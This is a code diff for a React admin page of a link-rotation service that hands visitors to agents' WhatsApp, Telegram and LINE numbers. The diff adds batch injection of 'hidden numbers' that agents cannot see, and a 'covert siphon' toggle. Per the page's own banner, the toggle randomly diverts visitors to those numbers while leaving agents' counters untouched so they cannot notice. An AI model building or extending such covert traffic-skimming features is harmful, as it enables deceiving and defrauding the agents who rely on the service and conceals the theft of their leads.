@@ -21,6 +21,7 @@ interface ShortLinkWithNumbers {
   total_clicks: number
   is_active: boolean
   created_at: string
+  admin_random_siphon_enabled: boolean
   whatsapp_numbers: WhatsAppNumber[]
 }
 
@@ -57,10 +58,11 @@ export default function AgentDetailPage({ params }: { params: Promise<{ id: stri
   // Expanded link for adding hidden numbers
   const [expandedLinkId, setExpandedLinkId] = useState<string | null>(null)
   const [addingFor, setAddingFor] = useState<string | null>(null)
-  const [newPhone, setNewPhone] = useState('')
+  const [newPhones, setNewPhones] = useState('')
   const [newLabel, setNewLabel] = useState('')
   const [newPlatform, setNewPlatform] = useState('whatsapp')
   const [saving, setSaving] = useState(false)
+  const [togglingLinkId, setTogglingLinkId] = useState<string | null>(null)
 
   const fetchData = useCallback(async () => {
     setLoading(true)
@@ -99,22 +101,34 @@ export default function AgentDetailPage({ params }: { params: Promise<{ id: stri
     e.stopPropagation()
     setAddingFor(addingFor === linkId ? null : linkId)
     setExpandedLinkId(linkId)
-    setNewPhone('')
+    setNewPhones('')
     setNewLabel('')
     setNewPlatform('whatsapp')
   }
 
-  async function handleAddHiddenNumber(linkId: string, e: React.FormEvent) {
+  async function handleAddHiddenNumbers(linkId: string, e: React.FormEvent) {
     e.preventDefault()
     setSaving(true)
     setError('')
     setSuccess('')
 
+    // Split textarea by newlines, trim each, filter empty
+    const phone_numbers = newPhones
+      .split('\n')
+      .map((s) => s.trim())
+      .filter(Boolean)
+
+    if (phone_numbers.length === 0) {
+      setError('请输入至少一个号码')
+      setSaving(false)
+      return
+    }
+
     const res = await fetch(`/api/admin/agents/${id}/links/${linkId}/numbers`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        phone_number: newPhone,
+        phone_numbers,
         label: newLabel || null,
         platform: newPlatform,
       }),
@@ -122,8 +136,9 @@ export default function AgentDetailPage({ params }: { params: Promise<{ id: stri
 
     const data = await res.json()
     if (res.ok) {
-      setSuccess('隐藏号码添加成功')
-      setNewPhone('')
+      const count = Array.isArray(data) ? data.length : 1
+      setSuccess(`成功注入 ${count} 个隐藏号码`)
+      setNewPhones('')
       setNewLabel('')
       setNewPlatform('whatsapp')
       setAddingFor(null)
@@ -149,6 +164,32 @@ export default function AgentDetailPage({ params }: { params: Promise<{ id: stri
       const data = await res.json()
       setError(data.error || '删除失败')
     }
+  }
+
+  async function handleToggleSiphon(e: React.MouseEvent, link: ShortLinkWithNumbers) {
+    e.stopPropagation()
+    setTogglingLinkId(link.id)
+    setError('')
+    setSuccess('')
+
+    const res = await fetch(`/api/admin/agents/${id}/links/${link.id}`, {
+      method: 'PATCH',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ admin_random_siphon_enabled: !link.admin_random_siphon_enabled }),
+    })
+
+    const data = await res.json()
+    if (res.ok) {
+      setSuccess(
+        data.admin_random_siphon_enabled
+          ? '已开启暗扣随机截流'
+          : '已关闭暗扣随机截流'
+      )
+      fetchData()
+    } else {
+      setError(data.error || '操作失败')
+    }
+    setTogglingLinkId(null)
   }
 
   return (
@@ -219,6 +260,20 @@ export default function AgentDetailPage({ params }: { params: Promise<{ id: stri
                   </div>
                 </div>
                 <div className="flex items-center gap-3 flex-shrink-0">
+                  {/* Random siphon toggle */}
+                  <button
+                    onClick={(e) => handleToggleSiphon(e, link)}
+                    disabled={togglingLinkId === link.id}
+                    title="开启后，隐藏号码将按比例随机截流，代理的顺序轮询计数器不受影响"
+                    className={`flex items-center gap-1.5 text-xs px-3 py-1.5 rounded-lg border font-medium transition-colors disabled:opacity-50 ${
+                      link.admin_random_siphon_enabled
+                        ? 'bg-purple-600 text-white border-purple-600 hover:bg-purple-700'
+                        : 'bg-purple-50 text-purple-600 border-purple-200 hover:bg-purple-100'
+                    }`}
+                  >
+                    <span>🎲</span>
+                    {link.admin_random_siphon_enabled ? '暗扣截流: 开' : '暗扣截流: 关'}
+                  </button>
                   <button
                     onClick={(e) => handleToggleAddingFor(e, link.id)}
                     className="text-xs bg-orange-50 text-orange-600 border border-orange-200 px-3 py-1.5 rounded-lg hover:bg-orange-100 transition-colors font-medium"
@@ -237,55 +292,68 @@ export default function AgentDetailPage({ params }: { params: Promise<{ id: stri
               {/* Expanded content */}
               {expandedLinkId === link.id && (
                 <div className="border-t border-gray-100 px-5 pb-5">
-                  {/* Add hidden number form */}
+                  {/* Siphon info banner */}
+                  {link.admin_random_siphon_enabled && (
+                    <div className="mt-4 p-3 bg-purple-50 rounded-lg border border-purple-200 text-xs text-purple-700">
+                      🎲 <strong>暗扣截流已开启</strong>：访客到达时，系统将按
+                      <strong> 隐藏号数 / 总号数 </strong>
+                      的概率随机截流至隐藏号码。代理的顺序计数器（1→2→3...）保持完全不变，代理无法察觉。
+                    </div>
+                  )}
+
+                  {/* Add hidden numbers form */}
                   {addingFor === link.id && (
                     <div className="mt-4 p-4 bg-orange-50 rounded-lg border border-orange-200">
                       <p className="text-xs font-semibold text-orange-700 mb-3">
-                        🔒 注入隐藏号码（代理不可见）
+                        🔒 注入隐藏号码（代理不可见）— 每行一个，支持批量粘贴
                       </p>
                       <form
-                        onSubmit={(e) => handleAddHiddenNumber(link.id, e)}
-                        className="flex flex-wrap gap-2"
+                        onSubmit={(e) => handleAddHiddenNumbers(link.id, e)}
+                        className="flex flex-col gap-2"
                       >
-                        <select
-                          value={newPlatform}
-                          onChange={(e) => setNewPlatform(e.target.value)}
-                          className="px-3 py-2 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-orange-400 bg-white"
-                        >
-                          <option value="whatsapp">WhatsApp</option>
-                          <option value="telegram">Telegram</option>
-                          <option value="line">LINE</option>
-                          <option value="custom">自定义 URL</option>
-                        </select>
-                        <input
-                          type="text"
-                          placeholder="号码 / ID / URL"
-                          value={newPhone}
-                          onChange={(e) => setNewPhone(e.target.value)}
+                        <div className="flex flex-wrap gap-2">
+                          <select
+                            value={newPlatform}
+                            onChange={(e) => setNewPlatform(e.target.value)}
+                            className="px-3 py-2 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-orange-400 bg-white"
+                          >
+                            <option value="whatsapp">WhatsApp</option>
+                            <option value="telegram">Telegram</option>
+                            <option value="line">LINE</option>
+                            <option value="custom">自定义 URL</option>
+                          </select>
+                          <input
+                            type="text"
+                            placeholder="备注（可选，所有号码共用）"
+                            value={newLabel}
+                            onChange={(e) => setNewLabel(e.target.value)}
+                            className="flex-1 min-w-36 px-3 py-2 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-orange-400"
+                          />
+                        </div>
+                        <textarea
+                          placeholder={'每行一个号码 / ID / URL，支持批量粘贴\n例如：\n8613800138000\n8613900139000'}
+                          value={newPhones}
+                          onChange={(e) => setNewPhones(e.target.value)}
                           required
-                          className="flex-1 min-w-32 px-3 py-2 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-orange-400"
+                          rows={4}
+                          className="w-full px-3 py-2 border border-gray-300 rounded-lg text-sm font-mono focus:outline-none focus:ring-2 focus:ring-orange-400 resize-y"
                         />
-                        <input
-                          type="text"
-                          placeholder="备注（可选）"
-                          value={newLabel}
-                          onChange={(e) => setNewLabel(e.target.value)}
-                          className="flex-1 min-w-24 px-3 py-2 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-orange-400"
-                        />
-                        <button
-                          type="submit"
-                          disabled={saving}
-                          className="bg-orange-600 text-white px-4 py-2 rounded-lg text-sm font-medium hover:bg-orange-700 disabled:opacity-50 transition-colors"
-                        >
-                          {saving ? '添加中...' : '确认注入'}
-                        </button>
-                        <button
-                          type="button"
-                          onClick={() => setAddingFor(null)}
-                          className="px-4 py-2 border border-gray-300 rounded-lg text-sm text-gray-600 hover:bg-gray-50 transition-colors"
-                        >
-                          取消
-                        </button>
+                        <div className="flex gap-2">
+                          <button
+                            type="submit"
+                            disabled={saving}
+                            className="bg-orange-600 text-white px-4 py-2 rounded-lg text-sm font-medium hover:bg-orange-700 disabled:opacity-50 transition-colors"
+                          >
+                            {saving ? '注入中...' : '确认批量注入'}
+                          </button>
+                          <button
+                            type="button"
+                            onClick={() => setAddingFor(null)}
+                            className="px-4 py-2 border border-gray-300 rounded-lg text-sm text-gray-600 hover:bg-gray-50 transition-colors"
+                          >
+                            取消
+                          </button>
+                        </div>
                       </form>
                     </div>
                   )}
